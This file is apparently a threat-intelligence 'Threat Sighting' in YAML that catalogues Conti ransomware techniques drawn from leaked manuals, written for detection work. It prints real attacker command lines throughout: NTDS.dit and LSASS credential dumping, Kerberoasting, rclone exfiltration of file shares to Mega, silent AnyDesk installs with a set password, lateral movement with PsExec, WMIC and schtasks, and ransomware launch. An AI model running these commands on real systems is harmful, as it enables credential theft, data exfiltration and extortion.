@@ -1,0 +1,616 @@
+---
+header:
+  sightingReportId: aad0ab55-6109-422b-afac-b7a9b0760b8b
+  status: wip
+  description: This Threat Sighting documents Conti ransomware TTPs based on Conti leaks (back in August 2021 and more recently Feb/March 2022). This Threat Sighting is based on public reports.
+  author: Alejandro Houspanossian (@lekz86)
+  acknowledgement: "@TheDFIRReport, @vxunderground"
+  tlp: white
+  threatInformation:
+    adversaries:
+    - Conti
+    malware:
+    - n/d
+    tools:
+    - 7zip.exe
+    - netscan.exe
+    - sqlcmd.exe
+    - rclone.exe
+    - anydesk.exe
+    - powershell.exe
+    - powershell_ise.exe
+    - psexec.exe
+    - adfind.exe
+    - ntdsutil.exe
+    - rubeus.exe
+    - Cobalt Strike
+    - net.exe
+    lolbas:
+    - wmic.exe
+    - cmd.exe
+    - vssadmin.exe
+    - esentutl.exe
+    - comsvcs.dll
+    - rundll32.exe
+    - schtasks.exe
+threatSightings:
+  - sighting: Command And Control - Conti used _WMIC via Cobalt Strike_ for Execution.
+    id: 2227028a-26fd-46ad-aa5d-90ba22fdd123
+    behaviors:
+    - behavior: _WMIC_ commands executed via _Cobalt Strike_.
+      id: 8780acb3-01ea-42df-9322-85bb515eb775
+      type: Process Created
+      weapon: wmic
+      processes:
+      - process: wmic.exe
+        cmdLine:
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\admin\" /password:\"cleartextpass\" process call create \"cmd /c vssadmin list shadows >> c:\\log.txt\"'
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\admin\" /password:\"cleartextpass\" process call create \"cmd /c vssadmin create shadow /for=C: 2>&1\"'
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\\admin\" /password:\"cleartextpass\" process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy55\\Windows\\NTDS\\NTDS.dit c:\\temp\\log\\ & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy55\\Windows\\System32\\config\\SYSTEM c:\\temp\\log\\ & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy55\\Windows\\System32\\config\\SECURITY c:\\temp\\log\\"'
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\admin\" /password:\"cleartextpass\" process call create \"7za.exe a -tzip -mx5 \\\\DC01\\C$\\temp\\log.zip \\\\DC01\\C$\\temp\\log -pTOPSECRETPASSWORD\"'
+        parentProcess: n/d
+      notes:
+      - _WMIC.exe_ (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.
+      att&ck:
+        execution:
+        - "T1047 - Windows Management Instrumentation"
+  - sighting: Command And Control - Conti used _vssadmin via WMI and Cobalt Strike_ to create a Volume Shadow Copy for Collection.
+    id: ccc7028a-26fd-46ad-ca5d-90ba6ffdcc23
+    behaviors:
+    - behavior: _WMIC_ ran _vssadmin_ command on domain controler (list and create Volume Shadow Copy).
+      id: 6780acb3-01ea-42df-9322-85bb515eb5a5
+      type: Process Created
+      weapon: vssadmin
+      processes:
+      - cmdLine:
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\admin\" /password:\"cleartextpass\" process call create \"cmd /c vssadmin list shadows >> c:\\log.txt\"'
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\admin\" /password:\"cleartextpass\" process call create \"cmd /c vssadmin create shadow /for=C: 2>&1\"'
+        process: wmic.exe
+        parentProcess: n/d
+      notes:
+      - _WMIC.exe_ (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.
+      - _vssadmin.exe_ (Windows Volume Shadow Copy Service administrative tool) allows creating backups of computer files.
+      att&ck:
+        execution:
+        - "T1047 - Windows Management Instrumentation"
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Conti used _doscmd/copy command via WMI and Cobalt Strike_ to move system files including _NTDS.dit_ for Collection.
+    id: aaa7028a-26fd-46ad-aa5d-aaaa6ffdd123
+    behaviors:
+    - behavior: _WMIC_ ran _doscmd/copy_ command to copy _NTDS.dit_ file to _Temp_ folder.
+      id: 0980acb3-01ea-42df-9322-85bb515eb534
+      type: Process Created
+      weapon: doscmd/copy
+      processes:
+      - cmdLine:
+        - 'wmic /node:\"DC01\" /user:\"DOMAIN\\admin\" /password:\"cleartextpass\" process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy55\\Windows\\NTDS\\NTDS.dit c:\\temp\\log\\ & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy55\\Windows\\System32\\config\\SYSTEM c:\\temp\\log\\ & copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy55\\Windows\\System32\\config\\SECURITY c:\\temp\\log\\"'
+        process: wmic.exe
+        parentProcess: n/d
+      att&ck:
+        credentialAccess:
+        - "T1003.003 - OS Credential Dumping: NTDS"
+        execution:
+        - "T1047 - Windows Management Instrumentation"
+  - sighting: Command And Control - Conti used _7zip via WMI and Cobalt Strike_ to archive collected files for Collection.
+    id: abc7028a-26fd-46ad-aa5d-90ba6ffdd123
+    behaviors:
+    - behavior: _7zip_ to archive collected data.
+      id: 5550acb3-01ea-42df-9322-85bb515eb555
+      type: Process Created
+      weapon: 7zip
+      processes:
+      - cmdLine:
+        - '7za.exe a -tzip -mx5 \\\\DC01\\C$\\temp\\log.zip \\\\DC01\\C$\\temp\\log -pTOPSECRETPASSWORD'
+        process: 7za.exe
+        parentProcess: n/d
+      att&ck:
+        collection:
+        - "T1560.001 - Archive Collected Data: Archive via Utility"
+  - sighting: Command And Control - Conti used _ntdsutil_ for Credential Access.
+    id: 71838949-749a-435f-b176-d52ce742b44f
+    behaviors:
+    - behavior: _ntdsutil_ execution.
+      id: 260a30ca-d602-4d84-80db-16606049114f
+      type: Process Created
+      weapon: ntdsutil
+      processes:
+      - cmdLine:
+        - ntdsutil \"ac in ntds\" \"ifm\" \"create full c:\\windows\\temp\\crashpad\\x\" q q
+        process: ntdsutil.exe
+        parentProcess: n/d
+      notes:
+      - _Ntdsutil.exe_ is a command-line tool that provides management facilities for Active Directory Domain Services (AD DS) and Active Directory Lightweight Directory Services (AD LDS).
+      - For most of the _Ntdsutil_ commands, you only need to type the _first few characters_ of the command name _instead than the entire command_.
+      - the paremeter "ifm" is modified by "create full"; the specified folder is where the copy will be created.
+      - https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc753343(v=ws.11)
+      att&ck:
+        credentialAccess:
+        - "T1003.003 - OS Credential Dumping: NTDS"
+  - sighting: Command And Control - Conti used _NetScan.exe via Cobalt Strike_ to scan internal network for Discovery.
+    id: 1237028a-34fd-46ad-aa5d-90ba6f12d123
+    behaviors:
+    - behavior: _NetScan.exe_ execution.
+      id: 4440acb3-01ea-42df-9322-85bb515eb5a5
+      type: Process Created
+      weapon: netscan
+      processes:
+      - cmdLine:
+        - 'netscan.exe /hide /auto:\"result.xml\" /config:netscan.xml /range:192.168.0.1-192.168.1.255'
+        process: C:\\ProgramData\\NetScan\\netscan.exe
+        parentProcess: n/d
+      notes:
+      - _NetScan.exe_ is a commercial network scanning tool that offer free trial version (https://www.softperfect.com/products/networkscanner/)
+      - "Results include: hostnames, open ports, group/domain membership, total disk space, available shares among other system details."
+      - As per the leaked Conti manuals, thret actors are looking for NAS and backup systems.
+      att&ck:
+        discovery:
+        - "T1046 - Network Service Scanning"
+    - behavior: _NetScan.exe_ output file created.
+      id: 5550acb3-01ea-42df-9322-85bb515eb5a5
+      type: File Created
+      weapon: netscan
+      files:
+        - name: result.xml
+          path: C:\\ProgramData\\NetScan\\result.xml
+          sha256: n/d
+          process: C:\\ProgramData\\NetScan\\netscan.exe
+      att&ck:
+        collection:
+        - "T1046 - Network Service Scanning"
+  - sighting: Command And Control - Conti used _Rclone_ to upload data to cloud storage for Exfiltration.
+    id: 23488865-5832-4a32-9bd2-ce139f25760b
+    behaviors:
+    - behavior: _Rclone_ execution.
+      id: 18b39945-7cc1-4532-8ac6-dd84027db585
+      type: Process Created
+      weapon: rclone
+      processes:
+      - cmdLine:
+        - 'rclone.exe copy \"\\\\company.com\\IT\\KLSHARE\" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'
+        - 'rclone.exe copy \"\\\\company.com\\E$\\FINANCE\" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 1 --transfers 3 --bwlimit 5M'
+        - 'rclone.exe copy \"\\\\company.com\\E$\\Data\" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'
+        - 'rclone.exe copy \"\\\\FS\\\" remote:NT    -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12'
+        - 'rclone.exe copy \"\\\\company.com\\Users\" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3'
+        process: rclone.exe
+        parentProcess: n/d
+      notes:
+      - "_Rclone_ is a command line program to manage files on cloud storage. Over 40 cloud storage products support rclone including S3 object stores, business & consumer file storage services, as well as standard transfer protocols (source: rclone.org)."
+      att&ck:
+        exfiltration:
+        - "T1567 - Exfiltration Over Web Service"
+  - sighting: Command And Control - Conti used _Rubeus.exe via Cobalt Strike_ for Credential Access.
+    id: f4c927e4-f3be-4465-86dd-8bd855e64f3d
+    behaviors:
+    - behavior: _Rubeus_ execution to output results at ProgramData folder (Kerberoasting).
+      id: d15706fa-1fc4-4185-86d0-44634f88ce2c
+      type: Process Created
+      weapon: rubeus
+      processes:
+      - cmdLine:
+        - Rubeus.exe kerberoast /ldapfilter:\'admincount=1\' /format:hashcat /outfile:C:\\ProgramData\\hashes.txt
+        process: C:\\Windows\\System32\\cmd.exe
+        parentProcess: n/d
+      notes:
+      - Rubeus is a C# toolset for raw Kerberos interaction and abuse.
+      - During _Kerberoasting_, the adversary attempts to extract password hashes for active directory user accounts through their Service Principal Name (SPN) ticket.
+      - https://awakesecurity.com/blog/kerberoasting-threat-hunting-for-active-directory-attacks/
+      att&ck:
+        credentialAccess:
+        - "T1558.003 - Steal or Forge Kerberos Tickets: Kerberoasting"
+    - behavior: _Rubeus_ execution to output results at ProgramData folder (AS-REP Roasting).
+      id: 655c306f-0926-415f-a163-c3573fe1b973
+      type: Process Created
+      weapon: rubeus
+      processes:
+      - cmdLine:
+        - Rubeus.exe asreproast /format:hashcat /outfile:C:\\ProgramData\\asrephashes.txt
+        process: C:\\Windows\\System32\\cmd.exe
+        parentProcess: n/d
+      notes:
+      - During _AS_REP Roasting_, the adversary attempts to extract password hashes of accounts that are set to _Do not require Kerberos preauthentication_; for offline cracking to get the cleartext passwords (https://luemmelsec.github.io/Kerberoasting-VS-AS-REP-Roasting/)
+      - The output of _Rubeus_ _/format:hashcat_ can be feed directly into _hashcat_ password cracker.
+      att&ck:
+        credentialAccess:
+        - "T1558.004 - Steal or Forge Kerberos Tickets: AS-REP Roasting"
+    - behavior: _Rubeus.exe_ output file created.
+      id: 02ff6138-58ac-4fab-9598-0fdd0862e343
+      type: File Created
+      weapon: rubeus
+      files:
+        - name: asrephashes.txt
+          path: C:\\ProgramData\\asrephashes.txt
+          process: Rubeus.exe
+        - name: hashes.txt
+          path: C:\\ProgramData\\hashes.txt
+          process: Rubeus.exe
+  - sighting: Command And Control - Conti used a _PowerShell inline script via Cobalt Strike_ to download and install _AnyDesk_ Remote Access Tool for Persistence.
+    id: 821481f8-9b9a-487f-8acc-3eb5a6cebc65
+    behaviors:
+    - behavior: _PowerShell ISE_ executed as admin.
+      id: 123840d5-f1e7-43b9-9e86-22f4c94bbe12
+      type: Process Created
+      weapon: powershell_ise
+      processes:
+      - cmdLine:
+        - C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe
+        process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe
+      att&ck:
+        execution:
+        - "T1059.001 - Command and Scripting Interpreter: PowerShell"
+    - behavior: _PowerShell ISE_ performed network connections to download.anydesk.com.
+      id: 7287dbd3-9d20-4a71-be8f-d455c2673d52
+      type: Network Accessed
+      weapon: powershell_ise
+      connections:
+        - dstIp: n/d
+          dstHost: download.anydesk.com
+          dstPort: 80
+          protocol: TCP
+          direction: outbound
+          process: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe"
+      att&ck:
+        commandAndControl:
+        - "T1071.001 - Application Layer Protocol: Web Protocols"
+    - behavior: _PowerShell ISE_ downloads _AnyDesk_
+      type: File Created
+      weapon: powershell_ise
+      id: 12367c9d-dab0-4852-90d3-1b22a68ca8d5
+      files:
+        - name: AnyDesk.exe
+          path: 'C:\\ProgramData\\AnyDesk.exe'
+          sha256: 4a9dde3979c2343c024c6eeeddff7639be301826dd637c006074e04a1e4e9fe7
+          process: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe"
+      att&ck:
+        commandAndControl:
+        - "T1219 - Remote Access Software"
+    - behavior: _PowerShell ISE_ spawns _CMD_ commands to install AnyDesk.
+      id: 40b840d5-f1e7-43b9-9e86-22f4c94bbea6
+      type: Process Created
+      weapon: powershell_ise
+      processes:
+      - cmdLine:
+        - cmd.exe /c C:\\ProgramData\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent
+        - cmd.exe /c echo J9kzQ2Y0qO \| C:\\ProgramData\\anydesk.exe --set-password
+        process: C:\\Windows\\System32\\cmd.exe
+        parentProcess: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe
+      notes:
+      - _AnyDesk_ is a Remote Desktop Application; it has a free version.
+      - The password 'J9kzQ2Y0qO' appears on Conti manuals leaked August 2021.
+      att&ck:
+        persistence:
+        - "T1219 - Remote Access Software"
+        execution:
+        - "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"
+  - sighting: Command And Control - Conti used _PowerShell_ commandlets to allow incomming RDP connections on an uncommon port for Defense Evasion.
+    id: 72c0d4fe-f417-4ca4-9e9a-75d10507d32c
+    behaviors:
+    - behavior: _New-NetFirewallRule_ commandlet adding new firewall rules for TCP and UDP connections.
+      id: 423ed799-a3bf-40fb-a6e3-cd9b64a5a229
+      type: Process Created
+      weapon: psh/New-NetFirewallRule
+      processes:
+      - process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+        cmdLine:
+        - New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol TCP -Action allow
+        - New-NetFirewallRule -DisplayName "New RDP Port 1350" -Direction Inbound -LocalPort 1350 -Protocol UDP -Action allow
+      notes:
+      - Remote Desktop Protocol (RDP) enables remote connections to other computers. RDP typically uses TCP port 3389.
+      att&ck:
+        defenseEvasion:
+        - "T1562.004 - Impair Defenses: Disable or Modify System Firewall"
+    - behavior: _Windows Registry_ to change port number for Remote Desktop Protocol access.
+      type: RegValue Created
+      id: 45623cbe-9bec-46a0-8e01-8cf576e07234
+      weapon: powershell
+      registries:
+        - keyName: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp
+          keyValueName: PortNumber
+          keyValue: "1350"
+          process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+      att&ck:
+        defenseEvasion:
+        - "T1112 - Modify Registry"
+    - behavior: _Restart-Service_ commandlet for restarting _termservice_ service.
+      id: db99bc28-9872-46ad-9ba0-92273de9c7de
+      type: Process Created
+      weapon: psh/Restart-Service
+      processes:
+      - cmdLine:
+        - Restart-Service termservice -force
+        process: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe
+      notes:
+      - _termservice_ is the Remote Desktop Services.
+      att&ck:
+        defenseEvasion:
+        - "T1562.004 - Impair Defenses: Disable or Modify System Firewall"
+  - sighting: Command And Control - Conti used _COM+ Service DLL via Cobalt Strike_ to dump _LSASS_ process memory for Credential Access.
+    id: 6e511699-3614-4f2b-88ee-cae8d41941b6
+    behaviors:
+    - behavior: _RunDll32_ launched _COM+ Services DLL_ (comsvcs.dll) to create a process memory dump.
+      id: 8eb9c153-5cb3-48f0-97fb-86c4e7c09a2d
+      type: Process Created
+      weapon: comsvcs.dll
+      processes:
+      - cmdLine:
+        - 'rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump #{pID} C:\\ProgramData\\lsass.dmp full'
+        process: C:\\Windows\\system32\\rundll32.exe
+      notes:
+      - _comsvcs.dll_  (_COM+ Service DLL_ in Windows) can create process memory dumps.
+      - Using _comsvcs.dll MimiDump_ for creating LSASS process memory dumps is a known trick.
+      - As per the leaked Conti manuals, Contis executed this command via _Cobalt Strike_
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+        defenseEvasion:
+        - "T1218.011 - Signed Binary Proxy Execution: Rundll32"
+  - sighting: Lateral Movement - Conti used _Task Manager over RDP_  to dump _LSASS_ process memory for Credential Access.
+    id: ccca1234-140a-465c-9a11-e586344646cc
+    behaviors:
+    - behavior: _Explorer_ opened _Task Manager_ (over _RDP_).
+      type: Process Created
+      id: dd5f6a8b-8123-1b14-93b5-d016ef189a12
+      weapon: taskmgr
+      processes:
+      - cmdLine:
+        - "\"C:\\Windows\\system32\\taskmgr.exe\" /7"
+        process: C:\\Windows\\system32\\taskmgr.exe
+        parentProcess: C:\\Windows\\Explorer.exe
+      att&ck:
+        lateralMovement:
+        - "T1021.001 - Remote Services: Remote Desktop Protocol"
+    - behavior: _Task Manager_ accessed _LSASS_ process memory.
+      id: 34d4e5f8-86eb-12fb-34c3-7a21cd2ac134
+      type: Code Injected
+      weapon: taskmgr
+      injections:
+      - target: C:\\Windows\\System32\\lsass.exe
+        from:  C:\\Windows\\system32\\taskmgr.exe
+    - behavior: _Task Manager_ created dump file.
+      id: 89d4e5f8-86eb-12fb-80c3-7a21cd2ac189
+      type: File Created
+      weapon: taskmgr
+      files:
+        - name: lsass.dmp
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\lsass.DMP'
+          process: C:\\Windows\\system32\\taskmgr.exe
+        - name: lsass (2).dmp
+          path: 'C:\\Users\\#{user}\\AppData\\Local\\Temp\\lsass (2).DMP'
+          process: C:\\Windows\\system32\\taskmgr.exe
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+  - sighting: Command And Control - Conti used _WMIC via Cobalt Strike_ to launch _comsvcs.dll_ via _RunDll32_ on remote systems for Credential Access.
+    id: f70bade9-574e-4029-a1ba-9b0bb7ee2b3a
+    behaviors:
+    - behavior: _WMIC_ command to launch _RunDll32_ on remote system.
+      id: 123430a3-22bb-4259-96cc-b8a2dd1e6612
+      type: Process Created
+      weapon: wmic
+      processes:
+      - cmdLine:
+        - 'wmic /node:#{target} process call create \"cmd /c rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump PID'
+        process: wmic.exe
+      att&ck:
+        execution:
+        - "T1047 - Windows Management Instrumentation"
+    - behavior: _comsvcs.dll_ executed on remote system to create a LSASS process memory dump.
+      id: 4f9730a3-22bb-4259-96cc-b8a2dd1e66e1
+      type: Process Created
+      weapon: comsvcs.dll
+      processes:
+      - cmdLine:
+        - 'wmic /node:#{target} process call create \"cmd /c rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump #{pID}'
+        process: C:\\Windows\\system32\\rundll32.exe
+      notes:
+      - _WMIC.exe_ (Windows Management Instrumentation Commandline utility) allows for command execution at remote hosts.
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+  - sighting: Command And Control - Conti used _PSEXEC via Cobalt Strike_ to launch _comsvcs.dll_ via _RunDll32_ on remote systems for Credential Access.
+    id: 93f0f633-2130-4aed-8ce5-81ae657b2e55
+    behaviors:
+    - behavior: _PSEXEC_ command to launch _RunDll32_ on remote system.
+      id: d8ff33ae-4ce6-448f-afd9-550e43cd8116
+      type: Process Created
+      weapon: psexec
+      processes:
+      - cmdLine:
+        - 'psexec #{target} cmd /c rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump #{pID}'
+        process: psexec.exe
+      notes:
+      - "_PSEXEC_ is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software (source: https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)"
+      att&ck:
+        execution:
+        - "T1569.002 - System Services: Service Execution"
+    - behavior: _comsvcs.dll_ executed on remote system to create a LSASS process memory dump.
+      id: 1a3da949-cef9-4fd9-ac8e-8436eba2061a
+      type: Process Created
+      weapon: psexec
+      processes:
+      - cmdLine:
+        - 'psexec #{target} cmd /c rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump #{pID}'
+        process: psexec.exe
+      att&ck:
+        credentialAccess:
+        - "T1003.001 - OS Credential Dumping: LSASS Memory"
+  - sighting: Command And Control - Conti used _PSEXEC via Cobalt Strike_ to copy malicious files into remote systems for Lateral Movement.
+    id: 6d3da858-cef9-4fd9-ac8e-8436eba2061b
+    behaviors:
+    - behavior: _PsExec.exe_ executes _doscmd/copy_ command on multiple target systems.
+      id: 8da6efd4-c4dc-43d4-8115-ad04f2a8bd86
+      type: Process Created
+      weapon: psexec
+      processes:
+      - cmdLine:
+        - PsExec.exe /accepteula @C:\\share$\\comps1.txt -u DOMAIN\\ADMINISTRATOR -p PASSWORD cmd /c COPY "\\\\Domain Controller\\share$\\fx166.exe" "C:\\windows\\temp\\"
+        process: PsExec.exe
+      notes:
+      - _@C:\\share$\\comps1.txt_ represents the list of target systems. The _copy_ command is executed on each system listed on comps1.txt.
+      - In this case, the malicious file is hosted at a shared folder at the Domain Controller
+      att&ck:
+        lateralMovement:
+        - "T1570 - Lateral Tool Transfer"
+  - sighting: Command And Control - Conti used _WMIC via Cobalt Strike_ to copy and start execution of malicious files into remote systems for Lateral Movement.
+    id: 5deb80ca-25da-4401-81ca-f1741b0db758
+    behaviors:
+    - behavior: _WMIC_ executes _bitsadmin /transfer_ command on multiple target systems.
+      id: 55dfa781-a41f-4f7d-a290-67bc9a5dad69
+      type: Process Created
+      weapon: bitsadmin
+      processes:
+      - cmdLine:
+        - wmic /node:@C:\\share$\\comps1.txt /user:\"DOMAIN\\Administrator\" /password:\"PASSWORD\" process call create \"cmd.exe /c bitsadmin /transfer fx166 \\\\Domain Controller\\share$\\fx166.exe %APPDATA%\\fx166.exe&%APPDATA%\\fx166.exe\"
+        process: wmic.exe
+      notes:
+      - _@C:\\share$\\comps1.txt_ represents the list of target systems. The _BITSAdmin_ command is executed on each system listed on comps1.txt.
+      - "_BITSAdmin_ is a command-line tool that you can use to create download or upload jobs (source: https://docs.microsoft.com/en-us/windows/win32/bits/bitsadmin-tool)"
+      att&ck:
+        lateralMovement:
+        - "T1570 - Lateral Tool Transfer"
+  - sighting: Command And Control - Conti used _SCHTASKS via Cobalt Strike_ to execute malicious files into remote systems for Lateral Movement.
+    id: 123b80ca-25da-4402-81ca-f1741b0db123
+    behaviors:
+    - behavior: _SCHTASKS_ to create tasks on remote system.
+      id: 765fa781-a41f-4f7d-a290-67bc9a5dad34
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - cmdLine:
+        - 'SCHTASKS /s remote-hostname123 /RU \"SYSTEM\" /create /tn \"WindowsSensor15\" /tr \"cmd.exe /c C:\\ProgramData\\srvvhost.exe\" /sc ONCE /sd 01/01/2021 /st 00: 00'
+        - 'SCHTASKS /s #{IP/HOSTNAME} /RU \"SYSTEM\" /create /tn \"WindowsSensor15\" /tr \"cmd.exe /c C:\\ProgramData\\P32.exe\" /sc ONCE /sd 01/01/1970 /st 00: 00'
+        - 'SCHTASKS /s #{IP/HOSTNAME} /run /TN  \"WindowsSensor15\'
+        - 'SCHTASKS /s #{IP/HOSTNAME} /TN \"WindowsSensor15\" /DELETE /F'
+        process: schtasks.exe
+      att&ck:
+        lateralMovement:
+        - "T1570 - Lateral Tool Transfer"
+    - behavior: _SCHTASKS_ to run tasks on remote system.
+      id: 777fa781-a41f-4f7d-a880-67bc9a5dad84
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - cmdLine:
+        - SCHTASKS /s #{IP/HOSTNAME} /run /TN  \"WindowsSensor15\"
+        process: schtasks.exe
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+    - behavior: _SCHTASKS_ to delete tasks on remote system.
+      id: 888fa781-a41f-4f7d-a880-67bc9a5dad84
+      type: Process Created
+      weapon: schtasks
+      processes:
+      - cmdLine:
+        - "SCHTASKS /s #{IP/HOSTNAME} /TN \"WindowsSensor15\" /DELETE /F"
+        process: schtasks.exe
+      att&ck:
+        execution:
+        - "T1053.005 - Scheduled Task/Job: Scheduled Task"
+  - sighting: Command And Control - Conti used _AdFind via Cobalt Strike_ for Discovery.
+    id: 12348949-749a-435f-b176-d65ce742b44f
+    behaviors:
+    - behavior: Sequence of _AdFind.exe_ commands.
+      type: Process Created
+      id: 12341eb5-1062-4ec1-be8b-e62af35c9521
+      weapon: adfind
+      processes:
+      - cmdLine:
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \"(objectcategory=person)\" > ad_users.txt'
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \"objectcategory=computer\" > ad_computers.txt'
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \"(objectcategory=organizationalUnit)\" > ad_ous.txt'
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -sc trustdmp > trustdump.txt'
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f (objectCategory=subnet) > subnets.txt'
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -f \"(objectcategory=group)\" > ad_group.txt'
+        - 'adfind.exe -h #{ip} -b dc=#{domain} -u #{user} -up #{password} -gcb -sc trustdmp > trustdump.txt'
+        process: adfind.exe
+      notes:
+      - _AdFind_ commands executed in sequense as in the well known _adf.bat_ script.
+      att&ck:
+        discovery:
+        - "T1016 - System Network Configuration Discovery"
+  - sighting: Command And Control - Conti used _Cobalt Strike_ to launch whole domain encryption for Impact.
+    id: 83148949-749a-435f-b176-d65ce742b11a
+    behaviors:
+    - behavior: Ransomware binary downloaded.
+      type: File Created
+      id: 33141eb5-1062-4e91-be8b-e622235c9521
+      weapon: cobaltstrike
+      files:
+      - name: o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe
+        path: C:\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe
+        sha256: 9cd3c0cff6f3ecb31c7d6bc531395ccfd374bcd257c3c463ac528703ae2b0219
+        process: n/d
+      - name: locker.bat
+        path: C:\\locker.bat
+        sha256: 1edfae602f195d53b63707fe117e9c47e1925722533be43909a5d594e1ef63d3
+        process: n/d
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+    - behavior: Injected Explorer launched ransowmware via _CMD_.
+      type: Process Created
+      id: 43241eb5-1062-4e91-be8b-e62af35c9521
+      weapon: doscmd/batch
+      processes:
+      - cmdLine:
+        - \"C:\\Windows\\System32\\cmd.exe\" /C  \"C:\\locker.bat\"
+        process: C:\\Windows\\System32\\cmd.exe
+        parentProcess: C:\\Windows\\Explorer.exe
+      notes:
+      - "_locker.bat_ will iterate on a list of target systems and then execute:"
+      - \`C:\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe -m -net -size 10 -nomutex -p \\\\TARGETHOST\C$\`
+      att&ck:
+        impact:
+        - "T1486 - Data Encrypted for Impact"
+        execution:
+        - "T1055 - Process Injection"
+    - behavior: Ransom notes written to all afected folders.
+      type: File Created
+      id: 45545eb5-1062-4e91-be8b-552af35c9525
+      weapon: cobaltstrike
+      files:
+      - name: readme.txt
+        path: C:\\Users\\Default\\AppData\\readme.txt
+        process: C:\\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe
+  - sighting: Command And Control - Conti used _RDP_ to launch whole domain encryption for Impact.
+    id: 76548949-749a-235f-b176-d65ce742b14a
+    behaviors:
+    - behavior: Ransomware binary downloaded via _RDP_.
+      type: File Created
+      id: 18141eb5-1062-4e91-be8b-e622235c9521
+      weapon: adhoc-malware
+      files:
+      - name: backup.exe
+        path: C:\\backup.exe
+        sha256: 7268dadee16e6ac6d618927c0061163505af6a591fae99fe207092f9d0e3cfd0
+        process: n/d
+      att&ck:
+        commandAndControl:
+        - "T1105 - Ingress Tool Transfer"
+    - behavior: Explorer launched ransowmare.
+      type: Process Created
+      id: 99941eb5-1062-4e91-be8b-e62af35c9521
+      weapon: adhoc-malware
+      processes:
+      - cmdLine:
+        - \"C:\\backup.exe"
+        process: C:\\Windows\\Explorer.exe
+        parentProcess: n/d
+      notes:
+      - _backup.exe_ connects to all host to run the malware.
+      att&ck:
+        impact:
+        - "T1486 - Data Encrypted for Impact"
+footer:
+  changeTracking:
+    created: 2022-03-09
+    lastModified: 2022-03-18
+    sightingVersion: 1.0
+    schemaVersion: 1.7
+  references:
+    - https://twitter.com/TheDFIRReport/status/1423361119926816776
+    - https://twitter.com/vxunderground/status/1423336151860002816
+    - https://twitter.com/TheDFIRReport/status/1498658331883364360
+    - https://github.com/tsale/translated_conti_leaked_comms
+    - https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/
+    - https://thedfirreport.com/2021/09/13/bazarloader-to-conti-ransomware-in-32-hours/
